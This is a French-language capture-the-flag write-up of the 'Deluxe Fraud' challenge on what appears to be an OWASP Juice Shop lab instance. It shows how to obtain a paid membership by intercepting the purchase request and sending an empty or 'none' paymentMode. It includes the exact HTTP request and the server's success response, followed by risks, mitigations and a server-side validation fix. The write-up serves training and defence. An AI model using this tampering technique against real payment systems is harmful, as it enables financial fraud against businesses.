# Deluxe Fraud

> **Category :** Improper Input Validation  
> **Difficulty :** 3  

## Methodology

1. **Recherche de faille**
   - Technique : Énumération, Analyse des requêtes
   - Outil : BurpSuite (Proxy, Interceptor)
   - Description : Navigation vers la page d'achat du membership Deluxe et interception des requêtes pour analyser les paramètres envoyés au serveur.

2. **Exploitation de la faille**
   - Technique : Manipulation de paramètres (Parameter Tampering)
   - Outil : BurpSuite (Repeater)
   - Description : Modification de la requête d'achat du membership Deluxe pour contourner le paiement. Envoi d'une requête avec le paramètre `paymentMode` vide ou supprimé, ce qui permet d'obtenir le statut Deluxe sans payer.

| Partie | Rôle |
|--------|------|
| `POST /rest/deluxe-membership` | Endpoint d'achat du membership Deluxe |
| `paymentMode` | Paramètre définissant le mode de paiement |
| `paymentMode: "none"` ou suppression | Contourne la vérification du paiement réel |

## Vulnerabilities

**Vulnerability :** Improper Input Validation - Contournement du processus de paiement

**Components :** Système de paiement, API REST, Logique métier

**Severity level :** Élevé

## Risks

- Fraude financière (obtention de services payants gratuitement)
- Perte de revenus pour l'entreprise
- Abus massif si la faille est découverte par d'autres attaquants
- Atteinte à l'intégrité du système de facturation

## Actions

**Risks mitigation strategies :**
- Valider tous les paramètres côté serveur
- Implémenter une vérification de paiement avec un provider externe (Stripe, PayPal)
- Journaliser toutes les transactions suspectes

**Remediation fixes :**
Valider le paiement côté serveur avant d'activer le membership :
```javascript
app.post('/rest/deluxe-membership', async (req, res) => {
    const { paymentMode, paymentId } = req.body;
    
    // Vérifier que le mode de paiement est valide
    if (!paymentMode || !['card', 'wallet'].includes(paymentMode)) {
        return res.status(400).json({ error: "Invalid payment mode" });
    }
    // Vérifier que le paiement a été effectué
    const paymentValid = await paymentProvider.verify(paymentId);
    if (!paymentValid) {
        return res.status(402).json({ error: "Payment required" });
    }
    // Activer le membership seulement après vérification
    await activateDeluxeMembership(req.user.id);
});
```

**Security practice :**
- Ne jamais faire confiance aux données envoyées par le client
- Implémenter une validation stricte de tous les paramètres d'entrée
- Vérifier les transactions de paiement auprès du provider avant de débloquer les services
- Effectuer des tests de sécurité sur tous les processus de paiement

## Evidences and artifacts

**Request :**
```http
POST /rest/deluxe-membership HTTP/2
Host: ctf.juice.cyber.epitest.eu
Content-Type: application/json
Authorization: Bearer [JWT_TOKEN]

{
    "paymentMode": "none"
}
```

**Response :**
```json
{
    "status": "success",
    "data": {
        "membershipStatus": "deluxe"
    }
}
```